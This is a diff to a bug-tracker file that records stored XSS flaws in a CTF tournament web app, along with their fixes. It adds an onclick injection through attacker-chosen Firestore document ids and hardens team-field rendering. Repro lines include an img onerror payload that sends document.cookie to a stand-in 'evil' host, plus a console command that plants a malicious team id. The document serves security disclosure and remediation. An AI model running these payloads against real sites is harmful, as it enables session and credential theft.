@@ -33,6 +33,16 @@ Status: `open` · `in-progress` · `fixed-not-deployed` · `resolved`.
 
 _From the 2026-07-21 verify-first triage of the marathon backlog (38 items → 14 real). P2s logged individually; the P3 tail is one cluster entry. Resolved/not-a-bug items were cleaned from the marathon backlog, not re-filed here._
 
+### BUG-025 — `tournament-lobby.html` puts the attacker-chosen team **doc id** into an onclick → live zero-click stored XSS  ·  P1  ·  fixed (pending deploy)
+- **Found:** 2026-07-24 · by Nancy (final XSS sweep of the tournament pages) · during the BUG-023 hardening pass
+- **Area:** `_app/arena/tournament-lobby.html:621,625` — `onclick="leaveTeam('" + team.id + "')"` / `joinTeam('" + team.id + "')"`, built into a string later assigned to `container.innerHTML`.
+- **Symptom:** the MOST SEVERE instance of the crafted-team-field class. `team.id` is the Firestore **document id**, and `teams.create` (firestore.rules:787) lets any authenticated user CHOOSE the id with no format constraint. A team created with id `x"><img src=x onerror=…>` closes the `onclick` attribute and the `<button>`, then injects a self-contained `<img onerror>` that executes **on page render — zero clicks required** — in the browser of every visitor (student / instructor / admin) to `tournament-lobby.html?id=<tid>`, for as long as that team doc exists. Script execution (session/credential theft), not mere defacement.
+- **Repro:** authed devtools: `firebase.firestore().doc('tournaments/<tid>/teams/x"><img src=x onerror=alert(document.domain)>').set({name:'x', members:[myUid], captain:myUid})`, then open that tournament's lobby.
+- **Root cause:** the doc id was treated as trusted; field-name-scoped hardening never considered `id` (it is not a document "field"). Enabled by BUG-024 (attacker-chosen id + no validation).
+- **Fix:** `const safeId = /^[A-Za-z0-9_-]{1,128}$/.test(team.id) ? team.id : '';` — join/leave buttons render only when `safeId` is truthy and interpolate `safeId` (a crafted id yields no button, and the anchored slug charset cannot contain a quote or angle bracket). Legit Firestore auto-ids and admin slugs (`team-red`) match the regex, so no legit regression. Rides the arena XSS-hardening deploy.
+- **Verified:** grep-clean (no raw `team.id` in any onclick); Nancy final sweep independently walked every sink → PROCEED; extracted-script `node --check` OK; lobby div balance 28/28.
+- **Related:** BUG-023 (same class, same hardening pass), BUG-024 (root cause — the durable fix constrains the team doc-id FORMAT in `firestore.rules`, not just field types).
+
 ### BUG-024 — `tournaments/*/teams` create rule accepts any field of any type (no validation)  ·  P1  ·  open
 - **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
 - **Area:** `firestore.rules:787` — `match /teams/{teamId} { allow create: if request.auth != null; ... }`
@@ -43,15 +53,16 @@ _From the 2026-07-21 verify-first triage of the marathon backlog (38 items → 1
 - **Verified:** rule read directly (`firestore.rules:786-788`).
 - **Related:** BUG-023 (the render-side XSS this enables); broadcast.html Phase A (defended client-side).
 
-### BUG-023 — `tournament-podium.html` renders `team.score` unescaped (stored XSS)  ·  P1  ·  open (podium) / fixed (broadcast.html)
+### BUG-023 — crafted team fields render unsafely across the tournament pages (stored XSS / DoS class)  ·  P1  ·  3 PUBLIC pages FIXED (pending deploy); admin + ranking deferred to BUG-024
 - **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
 - **Area:** `_app/arena/tournament-podium.html:433` and `:450` — `(t.score || 0)` interpolated into innerHTML with no escape/coercion.
 - **Symptom:** a team whose `score` field is an HTML string (writable via BUG-024) executes script in the browser of anyone viewing the podium — including a projected screen at a live event, the highest-value defacement target on the platform. The same pattern would have shipped in broadcast.html (3 render paths) but was coerced before commit.
 - **Repro:** create a team with `score` = `<img src=x onerror=fetch('//evil/'+document.cookie)>` (via BUG-024), open the podium for that tournament.
 - **Root cause:** numeric field assumed numeric and interpolated raw; every text field on the page is escaped but the numerics are not.
-- **Fix:** broadcast.html — coerced all interpolated numerics via `num()` = `Number(v)||0` + hex-whitelisted `sanitizeColor()` (this session, pre-commit). Podium — NOT YET; needs the same coercion at `:433`/`:450` (and any other raw numeric interpolation). Pairs with the BUG-024 rules fix.
-- **Verified:** broadcast fix grep-clean (no `(t.score||0)` in render paths); podium lines confirmed unescaped by read.
-- **Related:** BUG-024 (enabler); broadcast.html Phase A.
+- **Fix:** hardened all 3 PUBLIC arena render surfaces this session (pending deploy): **podium** (score→`num()`, color→`safeColor()` hex-whitelist, solves→`Array.isArray`, lastSolveTime+startTime `.toDate()`→`typeof==='function'` guard); **broadcast.html** (score/points→`num()`, color→`sanitizeColor()`, all 3 solves.length→`Array.isArray`, lastSolveLabel+startTime toDate-guard); **lobby** (color→inline hex-whitelist, memberCount+members×3→`Array.isArray`, status→validated class + `escHtml`, tournamentId→`encodeURIComponent` in hrefs, and team.id→onclick→`safeId` slug-validate [broken out as **BUG-025**, the most severe]). All static coercion/validation, no legit-render regression (real hex/auto-ids/Timestamps/arrays all preserved). Adversarial review CONVERGED over 6+ rounds (found a new sink each round — all fixed) → final sweep PROCEED. Chris gate + deploy pending.
+- **Deferred (same class, to be closed at the source by the BUG-024 rules root-fix):** `_app/admin/console.html` renderCtfTeams (same pattern, admin-gated) and `_app/components/CtfStandings.js` `rankTeams()` (a crafted non-numeric score NaN-corrupts the sort BEFORE display → wrong standings order → wrong-place credential). Non-blocking consistency tail also logged: self-only truncated `initials`, admin-only `duration`/`maxTeamSize`/`ch.points`, and a harmless `state.challenges['__proto__']` lookup (wrong-title-only, still `esc()`'d).
+- **Verified:** all 3 files grep-clean of attacker-reachable raw interpolation; extracted-script `node --check` OK on each; lobby div balance 28/28; Nancy final sweep walked every `innerHTML`/`html +=`/attribute/handler sink to its source.
+- **Related:** BUG-024 (root enabler — the durable fix, constrains team field types + doc-id format in rules); BUG-025 (team.id onclick stored XSS, most severe instance); broadcast.html Phase A.
 
 ### BUG-022 — CTF tournament standings have no tie-break; positions can be wrong on score ties  ·  P1  ·  RESOLVED (deployed + live-verified 2026-07-24)
 - **Found:** 2026-07-24 · by self · during HCA (Hexworth Credential Authority) design — grounding the credential design in the live tournament that feeds it
